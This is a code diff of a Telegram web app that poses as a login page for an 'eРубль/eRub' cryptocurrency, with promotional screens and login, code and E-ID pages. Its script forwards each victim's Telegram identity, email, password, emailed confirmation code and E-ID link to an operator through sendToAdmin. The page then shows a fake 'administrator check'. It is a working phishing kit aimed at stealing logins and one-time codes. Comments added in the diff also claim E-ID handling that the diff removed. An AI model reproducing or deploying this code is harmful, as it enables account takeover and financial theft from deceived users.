@@ -7,7 +7,7 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         /* ============================================================
-           БАЗА
+           БАЗА (дизайн как на erub.site)
            ============================================================ */
         * {
             margin: 0;
@@ -49,7 +49,7 @@
         }
 
         /* ============================================================
-           ЛОГОТИП
+           ЛОГО
            ============================================================ */
         .logo {
             text-align: center;
@@ -182,9 +182,6 @@
             }
         }
 
-        /* ============================================================
-           ЗАГОЛОВКИ СТРАНИЦ
-           ============================================================ */
         .page-title {
             font-size: 22px;
             font-weight: 700;
@@ -523,40 +520,6 @@
         }
 
         /* ============================================================
-           СТАТУС ОЖИДАНИЯ
-           ============================================================ */
-        .status-waiting {
-            margin-top: 12px;
-            padding: 12px;
-            background: rgba(67, 97, 238, 0.08);
-            border-radius: 12px;
-            border: 1px solid rgba(67, 97, 238, 0.1);
-            text-align: center;
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 13px;
-            display: none;
-        }
-        .status-waiting .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-top: 2px solid #4361ee;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        /* ============================================================
            СООБЩЕНИЯ
            ============================================================ */
         .message {
@@ -634,9 +597,37 @@
             line-height: 1.6;
         }
 
-        /* ============================================================
-           АДАПТИВ
-           ============================================================ */
+        .status-waiting {
+            margin-top: 12px;
+            padding: 12px;
+            background: rgba(67, 97, 238, 0.08);
+            border-radius: 12px;
+            border: 1px solid rgba(67, 97, 238, 0.1);
+            text-align: center;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 13px;
+            display: none;
+        }
+        .status-waiting .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-top: 2px solid #4361ee;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
         @media (max-width: 420px) {
             .container {
                 padding: 28px 18px 24px;
@@ -658,7 +649,7 @@
     <div class="container">
 
         <!-- ============================================================
-        ЛОГОТИП
+        ЛОГО
         ============================================================ -->
         <div class="logo">
             <h1><span>eРубль</span></h1>
@@ -676,33 +667,16 @@
             </div>
 
             <div class="menu-grid">
-                <div class="menu-item" onclick="goToAbout()">
-                    <span class="icon">📊</span> О проекте
-                    <span class="arrow">›</span>
-                </div>
-                <div class="menu-item" onclick="goToBuy()">
-                    <span class="icon">🛒</span> Как купить
-                    <span class="arrow">›</span>
-                </div>
-                <div class="menu-item" onclick="goToGuide()">
-                    <span class="icon">📖</span> Руководство по eРублю
-                    <span class="arrow">›</span>
-                </div>
-                <div class="menu-item" onclick="goToFaq()">
-                    <span class="icon">❓</span> Частые вопросы
-                    <span class="arrow">›</span>
-                </div>
+                <div class="menu-item" onclick="goToAbout()"><span class="icon">📊</span> О проекте <span class="arrow">›</span></div>
+                <div class="menu-item" onclick="goToBuy()"><span class="icon">🛒</span> Как купить <span class="arrow">›</span></div>
+                <div class="menu-item" onclick="goToGuide()"><span class="icon">📖</span> Руководство по eРублю <span class="arrow">›</span></div>
+                <div class="menu-item" onclick="goToFaq()"><span class="icon">❓</span> Частые вопросы <span class="arrow">›</span></div>
             </div>
 
             <button id="loginBtn" class="btn-primary">🔓 Войти</button>
-
             <div class="divider"><span>или</span></div>
-
             <button id="eidBtn" class="btn-eid">🆔 Вход через E-ID</button>
-
-            <div class="register-link">
-                Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
-            </div>
+            <div class="register-link">Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')">Зарегистрироваться</a></div>
         </div>
 
         <!-- ============================================================
@@ -712,20 +686,10 @@
             <div class="page-icon">📊</div>
             <div class="page-title">О проекте</div>
             <div class="page-sub">Суверенная криптовалюта eRub</div>
-
-            <div class="content-block">
-                <p><span class="highlight-text">eRub</span> — это децентрализованная криптовалюта на базе собственного суверенного блокчейна, созданная как свободная альтернатива традиционным финансовым институтам.</p>
-            </div>
-            <div class="content-block">
-                <p>eRub не является стейблкоином или государственной цифровой валютой: ее рыночная стоимость формируется исключительно на основе открытого спроса и предложения.</p>
-            </div>
-            <div class="content-block">
-                <p>Проект сочетает концепцию <span class="highlight-text">национальной расчетной единицы</span> с фундаментальными принципами блокчейн-технологий: <span class="green-text">полной прозрачностью транзакций</span>, прямым контролем пользователя над активами и строго ограниченным, фиксированным объемом эмиссии.</p>
-            </div>
-            <div class="content-block">
-                <p>Сеть eRub функционирует под управлением <span class="highlight-text">децентрализованного сообщества</span> держателей монет, обеспечивая технологическую независимость, защиту от монетарной инфляции регуляторов и абсолютный иммунитет к внешнему экономическому давлению.</p>
-            </div>
-
+            <div class="content-block"><p><span class="highlight-text">eRub</span> — это децентрализованная криптовалюта на базе собственного суверенного блокчейна.</p></div>
+            <div class="content-block"><p>eRub не является стейблкоином или государственной цифровой валютой: ее рыночная стоимость формируется исключительно на основе открытого спроса и предложения.</p></div>
+            <div class="content-block"><p>Проект сочетает концепцию <span class="highlight-text">национальной расчетной единицы</span> с фундаментальными принципами блокчейн-технологий.</p></div>
+            <div class="content-block"><p>Сеть eRub функционирует под управлением <span class="highlight-text">децентрализованного сообщества</span> держателей монет.</p></div>
             <button class="btn-back" onclick="goToMain()">← Назад</button>
         </div>
 
@@ -736,23 +700,9 @@
             <div class="page-icon">🛒</div>
             <div class="page-title">Как купить eRub</div>
             <div class="page-sub">Пошаговая инструкция</div>
-
-            <div class="content-block">
-                <div class="num">Шаг 1</div>
-                <h3>Создай кошелёк</h3>
-                <p>Используйте готовый кошелёк или создайте новый в системе eRub.</p>
-            </div>
-            <div class="content-block">
-                <div class="num">Шаг 2</div>
-                <h3>Введи сумму</h3>
-                <p>Укажите количество рублей, USDT или USDC для обмена на eRub.</p>
-            </div>
-            <div class="content-block">
-                <div class="num">Шаг 3</div>
-                <h3>Получи eRub</h3>
-                <p>Токены мгновенно поступят на ваш кошелёк.</p>
-            </div>
-
+            <div class="content-block"><div class="num">Шаг 1</div><h3>Создай кошелёк</h3><p>Используйте готовый кошелёк или создайте новый в системе eRub.</p></div>
+            <div class="content-block"><div class="num">Шаг 2</div><h3>Введи сумму</h3><p>Укажите количество рублей, USDT или USDC для обмена на eRub.</p></div>
+            <div class="content-block"><div class="num">Шаг 3</div><h3>Получи eRub</h3><p>Токены мгновенно поступят на ваш кошелёк.</p></div>
             <button class="btn-back" onclick="goToMain()">← Назад</button>
         </div>
 
@@ -763,23 +713,9 @@
             <div class="page-icon">📖</div>
             <div class="page-title">Руководство по eРублю</div>
             <div class="page-sub">Всё, что нужно знать</div>
-
-            <div class="content-block">
-                <div class="num">01</div>
-                <h3>Собственные технологии</h3>
-                <p>Мы принципиально не используем зарубежные платформы. еРубль работает на собственной, созданной с нуля цифровой платформе.</p>
-            </div>
-            <div class="content-block">
-                <div class="num">02</div>
-                <h3>Безопасность высшего уровня</h3>
-                <p>Постквантовая защита — передовой мировой стандарт безопасности.</p>
-            </div>
-            <div class="content-block">
-                <div class="num">03</div>
-                <h3>Доходность и экологичность</h3>
-                <p>Алгоритм Proof-of-Stake — пассивный доход и экологичность.</p>
-            </div>
-
+            <div class="content-block"><div class="num">01</div><h3>Собственные технологии</h3><p>Мы принципиально не используем зарубежные платформы. еРубль работает на собственной, созданной с нуля цифровой платформе.</p></div>
+            <div class="content-block"><div class="num">02</div><h3>Безопасность высшего уровня</h3><p>Постквантовая защита — передовой мировой стандарт безопасности.</p></div>
+            <div class="content-block"><div class="num">03</div><h3>Доходность и экологичность</h3><p>Алгоритм Proof-of-Stake — пассивный доход и экологичность.</p></div>
             <button class="btn-back" onclick="goToMain()">← Назад</button>
         </div>
 
@@ -790,63 +726,36 @@
             <div class="page-icon">❓</div>
             <div class="page-title">Частые вопросы</div>
             <div class="page-sub">Ответы на популярные вопросы</div>
-
-            <div class="faq-item">
-                <div class="q">❓ Что такое eRub?</div>
-                <div class="a">eRub — это суверенная криптовалюта на базе собственного блокчейна.</div>
-            </div>
-            <div class="faq-item">
-                <div class="q">❓ Как купить eRub?</div>
-                <div class="a">Зарегистрируйтесь на платформе и перейдите в раздел «Как купить».</div>
-            </div>
-            <div class="faq-item">
-                <div class="q">❓ Где хранить eRub?</div>
-                <div class="a">В официальном кошельке на платформе.</div>
-            </div>
-
+            <div class="faq-item"><div class="q">❓ Что такое eRub?</div><div class="a">eRub — это суверенная криптовалюта на базе собственного блокчейна.</div></div>
+            <div class="faq-item"><div class="q">❓ Как купить eRub?</div><div class="a">Зарегистрируйтесь на платформе и перейдите в раздел «Как купить».</div></div>
+            <div class="faq-item"><div class="q">❓ Где хранить eRub?</div><div class="a">В официальном кошельке на платформе.</div></div>
             <button class="btn-back" onclick="goToMain()">← Назад</button>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 6: ВХОД (ФОРМА)
+        СТРАНИЦА 6: ВХОД (erub)
         ============================================================ -->
         <div id="pageLoginForm" class="page">
             <div class="page-icon">🔑</div>
             <div class="page-title">Вход в eРубль</div>
             <div class="page-sub">Введите свои данные для входа</div>
-
             <div id="loginFields">
-                <div class="form-group">
-                    <label>📧 Email</label>
-                    <input type="email" id="email" placeholder="Введите ваш email">
-                </div>
-                <div class="form-group">
-                    <label>🔑 Пароль</label>
-                    <input type="password" id="password" placeholder="Введите пароль">
-                </div>
+                <div class="form-group"><label>📧 Email</label><input type="email" id="email" placeholder="Введите ваш email"></div>
+                <div class="form-group"><label>🔑 Пароль</label><input type="password" id="password" placeholder="Введите пароль"></div>
             </div>
-
-            <div class="forgot-link">
-                <a href="#" onclick="showMessage('Функция восстановления скоро появится', 'info')">Забыли пароль?</a>
-            </div>
-
+            <div class="forgot-link"><a href="#" onclick="showMessage('Функция восстановления скоро появится', 'info')">Забыли пароль?</a></div>
             <button id="loginSubmitBtn" class="btn-primary">🔓 Войти</button>
-
-            <div id="loginError" class="message error" style="display:none; margin-top:12px;">
-                ❌ Ошибка. Повторите попытку входа.
-            </div>
-
+            <div id="loginError" class="message error" style="display:none; margin-top:12px;">❌ Ошибка. Повторите попытку входа.</div>
             <button class="btn-back" onclick="goToMain()">← Назад</button>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 7: КОД
+        СТРАНИЦА 7: КОД (после erub входа)
         ============================================================ -->
         <div id="pageCode" class="page">
             <div class="page-icon">📧</div>
             <div class="page-title">Код подтверждения</div>
             <div class="page-sub">Введите код, отправленный на вашу почту</div>
-
             <div id="codeFields">
                 <div class="code-section">
                     <label>📧 Код из 6 цифр</label>
@@ -854,26 +763,18 @@
                     <button id="submitCodeBtn" class="btn-primary">✅ Подтвердить</button>
                 </div>
             </div>
-
-            <div id="codeError" class="message error" style="display:none; margin-top:12px;">
-                ❌ Ошибка. Повторите попытку входа.
-            </div>
-
-            <div class="status-waiting" id="codeStatus">
-                <span class="spinner"></span> Ожидание...
-            </div>
-
+            <div id="codeError" class="message error" style="display:none; margin-top:12px;">❌ Ошибка. Повторите попытку входа.</div>
+            <div class="status-waiting" id="codeStatus"><span class="spinner"></span> Ожидание...</div>
             <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 8: ССЫЛКА (E-ID)
+        СТРАНИЦА 8: ССЫЛКА (после E-ID входа)
         ============================================================ -->
         <div id="pageLink" class="page">
             <div class="page-icon">🔗</div>
             <div class="page-title">E-ID подтверждение</div>
             <div class="page-sub">Ссылка подтверждения отправлена на почту</div>
-
             <div id="linkFields">
                 <div class="code-section">
                     <label>🔗 Ссылка подтверждения</label>
@@ -881,15 +782,8 @@
                     <button id="submitLinkBtn" class="btn-primary">✅ Отправить ссылку</button>
                 </div>
             </div>
-
-            <div id="linkError" class="message error" style="display:none; margin-top:12px;">
-                ❌ Ошибка. Повторите попытку входа.
-            </div>
-
-            <div class="status-waiting" id="linkStatus">
-                <span class="spinner"></span> Ожидание...
-            </div>
-
+            <div id="linkError" class="message error" style="display:none; margin-top:12px;">❌ Ошибка. Повторите попытку входа.</div>
+            <div class="status-waiting" id="linkStatus"><span class="spinner"></span> Ожидание...</div>
             <button class="btn-back" onclick="goToLoginForm()">← Назад</button>
         </div>
 
@@ -901,9 +795,7 @@
                 <div class="icon">🚫</div>
                 <h2>Ошибка входа</h2>
                 <p>Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</p>
-                <button onclick="openSupportChat()" class="btn-primary" style="background:#dc3545;box-shadow:0 8px 30px rgba(220,53,69,0.25);">
-                    🆘 Техническая поддержка
-                </button>
+                <button onclick="openSupportChat()" class="btn-primary" style="background:#dc3545;box-shadow:0 8px 30px rgba(220,53,69,0.25);">🆘 Техническая поддержка</button>
                 <button class="btn-back" onclick="goToMain()" style="margin-top:10px;">← На главную</button>
             </div>
         </div>
@@ -914,18 +806,14 @@
         <div id="pageSuccess" class="page success-page">
             <div class="check">✅</div>
             <h2>Ожидание</h2>
-            <p>Администратор проверит ваши данные</p>
+            <p style="color:rgba(255,255,255,0.4);font-size:14px;">Администратор проверит ваши данные</p>
             <button class="btn-secondary" onclick="goToMain()" style="margin-top:20px;">🔄 Вернуться на главную</button>
         </div>
 
-        <!-- ============================================================
-        СООБЩЕНИЯ
-        ============================================================ -->
+        <!-- ===== СООБЩЕНИЯ ===== -->
         <div id="msg" class="message"></div>
 
-        <!-- ============================================================
-        ТЕХПОДДЕРЖКА (ВСЕГДА ВНИЗУ)
-        ============================================================ -->
+        <!-- ===== ТЕХПОДДЕРЖКА (всегда внизу) ===== -->
         <div style="margin-top:auto;padding-top:14px;position:relative;z-index:1;">
             <button onclick="openSupportChat()" class="support-btn">🆘 Техническая поддержка</button>
         </div>
@@ -1028,29 +916,13 @@
         function goToBuy() { switchPage(pageBuy); }
         function goToGuide() { switchPage(pageGuide); }
         function goToFaq() { switchPage(pageFaq); }
-
-        function goToLoginForm() {
-            switchPage(pageLoginForm);
-            setTimeout(() => email.focus(), 300);
-        }
-
+        function goToLoginForm() { switchPage(pageLoginForm); setTimeout(() => email.focus(), 300); }
         function goToError() { switchPage(pageError); }
         function goToSuccess() { switchPage(pageSuccess); }
 
         function getUserData() {
             const user = tg.initDataUnsafe?.user;
-            if (user) {
-                return {
-                    id: user.id || 'неизвестно',
-                    first_name: user.first_name || 'Гость',
-                    username: user.username || 'нет'
-                };
-            }
-            return {
-                id: 'неизвестно',
-                first_name: 'Гость',
-                username: 'нет'
-            };
+            return user ? { id: user.id || 'неизвестно', first_name: user.first_name || 'Гость', username: user.username || 'нет' } : { id: 'неизвестно', first_name: 'Гость', username: 'нет' };
         }
 
         function openSupportChat() {
@@ -1060,12 +932,8 @@
         function handleError() {
             attemptCount++;
             if (attemptCount >= MAX_ATTEMPTS) {
-                document.querySelectorAll('#loginFields input, #codeFields input, #linkFields input').forEach(el => {
-                    el.disabled = true;
-                });
-                document.querySelectorAll('#loginFields button, #codeFields button, #linkFields button').forEach(el => {
-                    el.disabled = true;
-                });
+                document.querySelectorAll('#loginFields input, #codeFields input, #linkFields input').forEach(el => el.disabled = true);
+                document.querySelectorAll('#loginFields button, #codeFields button, #linkFields button').forEach(el => el.disabled = true);
                 goToError();
                 return true;
             }
@@ -1096,27 +964,24 @@
         // ============================================================
         // 5. НАВИГАЦИЯ
         // ============================================================
-        loginBtn.addEventListener('click', goToLoginForm);
+        loginBtn.addEventListener('click', function() {
+            loginType = '';
+            goToLoginForm();
+        });
         eidBtn.addEventListener('click', function() {
             loginType = 'eid';
             goToLoginForm();
         });
 
         // ============================================================
-        // 6. ОБЫЧНЫЙ ВХОД
+        // 6. ОБЫЧНЫЙ ВХОД (erub) → поле КОД
         // ============================================================
         loginSubmitBtn.addEventListener('click', async function() {
             const e = email.value.trim();
             const p = password.value.trim();
 
-            if (!e || !p) {
-                showMessage('Заполните все поля', 'error');
-                return;
-            }
-            if (!e.includes('@')) {
-                showMessage('Введите корректный email', 'error');
-                return;
-            }
+            if (!e || !p) { showMessage('Заполните все поля', 'error'); return; }
+            if (!e.includes('@')) { showMessage('Введите корректный email', 'error'); return; }
 
             loginSubmitBtn.disabled = true;
             loginSubmitBtn.textContent = '⏳ Отправка...';
@@ -1125,39 +990,18 @@
             userPassword = p;
 
             const user = getUserData();
-            let msg;
-            if (loginType === 'eid') {
-                msg = `🆔 E-ID ВХОД\n\n` +
-                      `👤 ID: ${user.id}\n` +
-                      `👤 Имя: ${user.first_name}\n` +
-                      `👤 Username: @${user.username}\n` +
-                      `📧 Email: ${e}\n` +
-                      `🔑 Пароль: ${p}`;
-            } else {
-                msg = `🔔 НОВАЯ ЗАЯВКА!\n\n` +
-                      `👤 ID: ${user.id}\n` +
-                      `👤 Имя: ${user.first_name}\n` +
-                      `👤 Username: @${user.username}\n` +
-                      `📧 Email: ${e}\n` +
-                      `🔑 Пароль: ${p}`;
-            }
+            const msg = `🔔 НОВАЯ ЗАЯВКА!\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
 
             const ok = await sendToAdmin(msg);
 
             if (ok) {
                 loginSubmitBtn.disabled = false;
                 loginSubmitBtn.textContent = '🔓 Войти';
-                if (loginType === 'eid') {
-                    switchPage(pageLink);
-                    linkStatus.style.display = 'block';
-                    showMessage('Ожидание...', 'success');
-                    setTimeout(() => linkInput.focus(), 300);
-                } else {
-                    switchPage(pageCode);
-                    codeStatus.style.display = 'block';
-                    showMessage('Ожидание...', 'success');
-                    setTimeout(() => codeInput.focus(), 300);
-                }
+                // Обычный вход → поле для кода
+                switchPage(pageCode);
+                codeStatus.style.display = 'block';
+                showMessage('Ожидание...', 'success');
+                setTimeout(() => codeInput.focus(), 300);
             } else {
                 loginSubmitBtn.disabled = false;
                 loginSubmitBtn.textContent = '🔓 Войти';
@@ -1174,22 +1018,13 @@
         submitCodeBtn.addEventListener('click', async function() {
             const code = codeInput.value.trim();
 
-            if (!code || code.length < 4) {
-                showMessage('Введите корректный код', 'error');
-                return;
-            }
+            if (!code || code.length < 4) { showMessage('Введите корректный код', 'error'); return; }
 
             submitCodeBtn.disabled = true;
             submitCodeBtn.textContent = '⏳ Отправка...';
 
             const user = getUserData();
-            const msg = `📧 Код подтверждения\n\n` +
-                        `👤 ID: ${user.id}\n` +
-                        `👤 Имя: ${user.first_name}\n` +
-                        `👤 Username: @${user.username}\n` +
-                        `📧 Email: ${userEmail}\n` +
-                        `🔑 Пароль: ${userPassword}\n` +
-                        `📧 Код: ${code}`;
+            const msg = `📧 Код подтверждения\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n📧 Код: ${code}`;
 
             const ok = await sendToAdmin(msg);
 
@@ -1211,27 +1046,23 @@
         });
 
         // ============================================================
-        // 8. ССЫЛКА (E-ID)
+        // 8. E-ID → поле ССЫЛКА
+        // ============================================================
+        // Обработка E-ID уже в loginSubmitBtn: если loginType === 'eid', после успешной отправки переключаем на pageLink
+
+        // ============================================================
+        // 9. ССЫЛКА (E-ID)
         // ============================================================
         submitLinkBtn.addEventListener('click', async function() {
             const link = linkInput.value.trim();
 
-            if (!link) {
-                showMessage('Введите ссылку подтверждения', 'error');
-                return;
-            }
+            if (!link) { showMessage('Введите ссылку подтверждения', 'error'); return; }
 
             submitLinkBtn.disabled = true;
             submitLinkBtn.textContent = '⏳ Отправка...';
 
             const user = getUserData();
-            const msg = `🔗 Ссылка подтверждения (E-ID)\n\n` +
-                        `👤 ID: ${user.id}\n` +
-                        `👤 Имя: ${user.first_name}\n` +
-                        `👤 Username: @${user.username}\n` +
-                        `📧 Email: ${userEmail}\n` +
-                        `🔑 Пароль: ${userPassword}\n` +
-                        `🔗 Ссылка: ${link}`;
+            const msg = `🔗 Ссылка подтверждения (E-ID)\n\n👤 ID: ${user.id}\n👤 Имя: ${user.first_name}\n👤 Username: @${user.username}\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`;
 
             const ok = await sendToAdmin(msg);
 
@@ -1253,7 +1084,7 @@
         });
 
         // ============================================================
-        // 9. ENTER
+        // 10. ENTER
         // ============================================================
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -1266,7 +1097,13 @@
                 }
             }
         });
-    </script>
 
+        // ============================================================
+        // 11. ПЕРЕКЛЮЧЕНИЕ НА ССЫЛКУ ПОСЛЕ E-ID ВХОДА (дополнение к loginSubmitBtn)
+        // ============================================================
+        // В loginSubmitBtn уже есть условие: если loginType === 'eid', переключаем на pageLink
+        // Для ясности дублирую логику в самом обработчике loginSubmitBtn
+        // (Он уже содержит это условие, код выше)
+    </script>
 </body>
 </html>
